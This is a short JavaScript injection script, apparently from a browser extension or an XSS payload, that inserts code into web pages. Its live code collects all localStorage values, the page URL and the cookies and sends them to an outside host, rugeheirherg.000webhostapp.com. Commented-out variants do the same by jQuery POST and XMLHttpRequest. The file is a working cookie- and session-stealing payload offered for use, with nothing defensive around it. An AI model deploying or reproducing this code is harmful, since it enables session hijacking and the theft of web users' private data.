
// this is the code which will be injected into a given page...

(function() {

    //Inject jquery. Dosent seem to work
    var head = document.getElementsByTagName("head")[0];
    var jquery = document.createElement("script");
    jquery.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js";
    head.appendChild(jquery);

    

    //Create a script element
    var script = document.createElement('script');

    //Code to inject
    //PRINT ALL OF LOCAL STORAGE
        //script.innerHTML = 'if (typeof(Storage) !== "undefined") {for (var i = 0; i < localStorage.length; i++){console.log("DATA           "+localStorage.getItem(localStorage.key(i)));}}';
    
    //Print all cookies
        //script.innerHTML = 'console.log(document.cookie);';

    //Send cookies to webpage
        //script.innerHTML = 'var cook=document.cookie;console.log(document.cookie);data1={data:cook};$.post("https://rugeheirherg.000webhostapp.com/data.php", data1, function(data, status){console.log(data);});';

    //Ultimate. All of above
    script.innerHTML = '    var dataitems = [];if (typeof(Storage) !== "undefined") {for  (var i = 0; i < localStorage.length; i++) {dataitems.push(localStorage.getItem(localStorage.key(i)));}}var thisurl = window.location.href;var cookiesin = document.cookie;var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://rugeheirherg.000webhostapp.com/senddataget.php?website="+thisurl+"&cookies="+cookiesin+"&localdata="+dataitems , false );xmlHttp.send( null );console.log("COOKIE=  " + cookiesin);console.log("DATA=   "+dataitems)';

    //Add script
    head.appendChild(script);

   /*
   //Works with jquery already on site
    var dataitems = [];
    if (typeof(Storage) !== "undefined") {
        for  (var i = 0; i < localStorage.length; i++) {
            dataitems.push(localStorage.getItem(localStorage.key(i)));
        }
    }
    var thisurl = window.location.href;
    var cookiesin = document.cookie;
    postdata = {website:thisurl, cookies:cookiesin, localdata:dataitems};
    window.setTimeout(post(),2000);
    
    function post(){
        $.post("https://rugeheirherg.000webhostapp.com/senddata.php", postdata, function(data, status){console.log(data);});
    }


    //Works if no jquery on site
    var dataitems = [];
    if (typeof(Storage) !== "undefined") {
        for  (var i = 0; i < localStorage.length; i++) {
            dataitems.push(localStorage.getItem(localStorage.key(i)));
        }
    }
    var thisurl = window.location.href;
    var cookiesin = document.cookie;
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://rugeheirherg.000webhostapp.com/senddata.php?website="+thisurl+"&cookies="+cookiesin+"&localdata="+dataitems , false ); 
    xmlHttp.send( null );
    
   */

   


})();